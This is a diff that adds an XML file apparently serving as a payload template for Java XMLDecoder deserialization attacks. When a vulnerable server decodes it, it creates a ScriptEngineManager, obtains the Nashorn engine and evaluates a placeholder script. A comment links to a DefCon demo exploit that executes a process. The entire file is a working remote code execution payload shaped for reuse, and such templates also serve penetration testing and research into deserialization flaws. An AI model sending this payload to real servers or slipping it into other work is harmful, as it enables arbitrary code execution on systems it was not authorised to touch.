@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<java>
+    <!-- see https://github.com/o2platform/DefCon_RESTing/blob/master/Demos/_O2_Scripts/XmlEncoder%20-%20Restlet/exploits/8e%20-%20HttpResponse%20-%20execute%20process%20-%20read%20two%20lines.xml -->
+     <object class="javax.script.ScriptEngineManager">
+        <void id="mgr" method="getEngineByName">
+            <string>nashorn</string>
+            <!-- todo: pre-nashorn js -->
+        </void>
+    </object>
+    <object idref="mgr">
+        <void method="eval">
+            <string>
+                {0}
+            </string>
+        </void>
+    </object>
+</java>
